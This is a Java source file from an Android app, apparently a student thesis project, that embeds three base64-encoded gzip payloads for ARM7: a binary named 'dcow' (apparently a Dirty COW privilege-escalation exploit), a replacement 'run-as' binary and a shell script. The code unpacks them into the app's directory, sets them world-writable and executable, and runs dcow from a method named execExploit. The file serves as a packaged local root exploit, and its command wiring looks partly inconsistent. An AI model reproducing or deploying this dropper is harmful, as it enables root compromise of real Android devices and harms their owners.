package com.example.tfm_final_app.Model;

import android.util.Log;

import org.apache.commons.net.util.Base64;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.zip.DataFormatException;
import java.util.zip.GZIPInputStream;
import java.util.zip.Inflater;


public class Payloads {


    private final String pARM7_dcow_gzip_base64 = new String("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");
    private final String pARM7_runas_gzip_base64 = new String("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");


    private final String pARM7_exec_gzip_base64 = new String( "H4sICGI0N10AA2V4ZWMuc2gArZBLDsIwDET3PoUR69SsOQYXqNzUUSo5H8UppbcHVVygiM2sZp6e5nqh1RpNSybJT5zYIoCPZcvoHmhRVO9HIs3c+VOWRjfyJQ3y4lRVhh7SGJbMOnKtFBYVo9mX7Q+YtmbHBqCG7twU4LTvL2pItluXdBz4tX0DNcSpW1MBAAA=");
    public Payloads() {
    }

    public void unZip(String filesDirinApp)
    {
        String fileDirRunas = filesDirinApp + "/run-as";
        String fileDirDcow = filesDirinApp +  "/dcow";
        String fileDirExec = filesDirinApp + "/exec.sh";

        byte[] pARM7_dcow_gzip = Base64.decodeBase64(pARM7_dcow_gzip_base64);
        byte[] pARM7_runas_gzip = Base64.decodeBase64(pARM7_runas_gzip_base64);
        byte[] pARM7_exec_gzip = Base64.decodeBase64(pARM7_exec_gzip_base64);

        zipToFile(pARM7_runas_gzip, fileDirRunas);
        zipToFile(pARM7_dcow_gzip, fileDirDcow);
        zipToFile(pARM7_exec_gzip, fileDirExec);
    }

    /* Convierte el ZIP en un array de bytes que posteriormente se almacenan*/

    public void zipToFile(byte[] gzip, String fname) {

        try {
            ByteArrayInputStream bytein = new ByteArrayInputStream(gzip);
            GZIPInputStream gzin = new GZIPInputStream(bytein);
            ByteArrayOutputStream byteout = new ByteArrayOutputStream();

            int res = 0;
            byte buf[] = new byte[1024];
            while (res >= 0) {
                res = gzin.read(buf, 0, buf.length);
                if (res > 0) {
                    byteout.write(buf, 0, res);
                }
            }
            byte uncompressed[] = byteout.toByteArray();
            writeFile(uncompressed, fname);
        }
        catch (Exception ee){
            Log.e("", ee.getMessage());

        }
    }

    /* Guarda el array de bytes en un fichero*/

    public File writeFile(byte[] bytes, String fileName)
    {
        File file = new File(fileName);
        try {

            OutputStream os = new FileOutputStream(file);

            os.write(bytes);
            os.close();
        }

        catch (Exception e) {
            Log.e("Error: ", e.getMessage());
        }
        return file;
    }

    public void execExploit(String dataDirWHapp, String filesDirinApp){
        String cwd2 = "/system/bin/";

        String fileDirRunas = filesDirinApp + "/run-as";
        String fileDirDcow = filesDirinApp +  "/dcow";
        String fileDirExec = filesDirinApp + "/exec.sh";
        String exploit = fileDirDcow + " " + fileDirRunas + "/system/bin/run-as";


        //
        String[] args = {fileDirExec};

        try {

            Process p1 = Runtime.getRuntime().exec("chmod 777 " + fileDirRunas);
            Process p2 = Runtime.getRuntime().exec("chmod 777 " +  fileDirDcow);
            Process p3 = Runtime.getRuntime().exec("chmod 777 " + fileDirExec);

            Process p0 = Runtime.getRuntime().exec("ls -l " + filesDirinApp);

            //
            Process p = Runtime.getRuntime().exec( "dcow " + fileDirExec + " /data/data/com.example.tfm_final_app/files/test.sh");

            //Process p = Runtime.getRuntime().exec("sh " + fileDirExec);

            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(p0.getInputStream()));

            // Grab the results
            StringBuilder log = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                Log.d("Exploit result: ", line + "\n");
            }

        }catch(IOException e) {
            e.printStackTrace();
        }
    }

}
